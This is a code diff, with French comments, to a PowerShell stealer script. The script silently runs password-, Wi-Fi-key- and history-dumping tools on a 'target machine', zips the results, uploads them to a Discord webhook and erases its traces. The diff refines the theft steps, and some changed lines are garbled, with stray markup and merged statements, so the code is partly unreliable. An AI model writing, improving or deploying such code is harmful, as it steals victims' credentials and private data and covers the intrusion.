@@ -10,7 +10,7 @@ $basePath = "C:\Users\Public\Documents\scripts"
 $dumpFolder = "$basePath\$env:USERNAME-$(get-date -f yyyy-MM-dd)"
 $dumpFile = "$dumpFolder.zip"
 
-# Nettoyage préventif pour libérer les fichiers s'ils sont verrouillés
+# Nettoyage préventif
 Stop-Process -Name "chromepass", "WirelessKeyView", "BrowsingHistoryView", "WNetWatcher" -Force -ErrorAction SilentlyContinue
 Start-Sleep -Seconds 1
 
@@ -36,20 +36,22 @@ try {
 Stop-Process -Name "chrome", "msedge", "firefox", "brave" -Force -ErrorAction SilentlyContinue
 Start-Sleep -Seconds 3
 
-# --- EXTRACTION CHROMEPASS AVEC DOSSIER DE TRAVAIL FORCÉ ---
+# --- EXTRACTION CHROMEPASS PROPRE (MODE SILENCIEUX FORCÉ) ---
 Write-Host "[*] Lancement de chromepass..." -ForegroundColor Yellow
-$explorer = Get-Process -IncludeUserName | Where-Object {$_.ProcessName -eq "explorer"} | Select-Object -First 1
+$explorer = Get-Process -IncludeUserName \vert{} Where-Object {$_.ProcessName -eq "explorer"} | Select-Object -First 1
 
 if ($explorer) {
+    # On lance l'outil et on le laisse écrire ses données pendant 5 secondes
     $processInfo = New-Object System.Diagnostics.ProcessStartInfo
     $processInfo.FileName = "$basePath\chromepass.exe"
-    $processInfo.Arguments = "/stext passwords.txt"
-    $processInfo.WorkingDirectory = $basePath
-    $processInfo.UseShellExecute = $true
-    [System.Diagnostics.Process]::Start($processInfo) | Out-Null
-    Start-Sleep -Seconds 6
+    $processInfo.Arguments = "/stext `"$basePath\passwords.txt`""
+    $processInfo.UseShellExecute =$true
+    $p = [System.Diagnostics.Process]::Start($processInfo)
+    Start-Sleep -Seconds 5
+    # On ferme de force la fenêtre graphique pour libérer le fichier et passer à la suite
+    Stop-Process -Name "chromepass" -Force -ErrorAction SilentlyContinue
 } else {
-    Start-Process -FilePath "$basePath\chromepass.exe" -ArgumentList "/stext passwords.txt" -WorkingDirectory $basePath -Wait -WindowStyle Hidden
+    Start-Process -FilePath "$basePath\chromepass.exe" -ArgumentList "/stext `"$basePath\passwords.txt`"" -Wait -WindowStyle Hidden
 }
 
 # Exécution des autres outils avec chemins absolus
@@ -63,10 +65,13 @@ if (Test-Path "$basePath\WNetWatcher.exe") {
     Start-Process -FilePath "$basePath\WNetWatcher.exe" -ArgumentList "/stext $basePath\connected_devices.txt" -Wait -WindowStyle Hidden
 }
 
+# Petite pause pour s'assurer que les fichiers texte sont bien fermés par les binaires
+Start-Sleep -Seconds 2
+
 # Vérification et sécurisation des fichiers générés
 foreach ($file in @("passwords.txt", "wifi.txt", "history.txt", "connected_devices.txt")) {
     $filePath = "$basePath\$file"
-    if (!(Test-Path $filePath)) {
+    if (!(Test-Path $filePath) -or ((Get-Item$filePath).Length -eq 0)) {
         Set-Content -Path $filePath -Value "No data captured"
     }
     Move-Item $filePath -Destination "$dumpFolder" -Force
@@ -80,7 +85,7 @@ if (!(Test-Path $dumpFile)) { exit 1 }
 Write-Host "[*] Envoi sur Discord..." -ForegroundColor Yellow
 if (-not ("System.Net.Http.HttpClient" -as [type])) {
     $httpPath = Get-ChildItem -Path "C:\Windows\Microsoft.NET\Framework64\" -Recurse -Filter "System.Net.Http.dll" | Select-Object -First 1 -ExpandProperty FullName
-    if ($httpPath) { Add-Type -Path $httpPath } else { exit 1 }
+    if ($httpPath) { Add-Type -Path$httpPath } else { exit 1 }
 }
 
 $client = New-Object System.Net.Http.HttpClient
@@ -88,21 +93,21 @@ $content = New-Object System.Net.Http.MultipartFormDataContent
 $content.Add((New-Object System.Net.Http.StringContent("Data from $env:USERNAME")), "content")
 
 $fileStream = [System.IO.File]::OpenRead("$dumpFile")
-$fileContent = New-Object System.Net.Http.StreamContent($fileStream)
-$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
+$fileContent = New-Object System.Net.Http.StreamContent($fileStream)$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
 $content.Add($fileContent, "file", [System.IO.Path]::GetFileName("$dumpFile"))
 
 try { 
-    $client.PostAsync($webhookUrl, $content).Wait() 
+    $client.PostAsync($webhookUrl,$content).Wait() 
     Write-Host "[+] Envoi reussi !" -ForegroundColor Green
 } catch {
     Write-Host "[-] Erreur lors de l'envoi Discord : $_" -ForegroundColor Red
 }
 
-$fileStream.Close()
-$fileStream.Dispose()
+$fileStream.Close()$fileStream.Dispose()
 
-# Nettoyage des traces sur la machine cible
-Remove-Item -Recurse -Force $basePath
-Remove-Item "C:\Users\Public\Documents\ps.ps1" -Force
+# Nettoyage final sécurisé (on tue tout ce qui pourrait bloquer avant de supprimer)
+Stop-Process -Name "chromepass", "WirelessKeyView", "BrowsingHistoryView", "WNetWatcher" -Force -ErrorAction SilentlyContinue
+Start-Sleep -Seconds 1
+Remove-Item -Recurse -Force $basePath -ErrorAction SilentlyContinue
+Remove-Item "C:\Users\Public\Documents\ps.ps1" -Force -ErrorAction SilentlyContinue
 exit
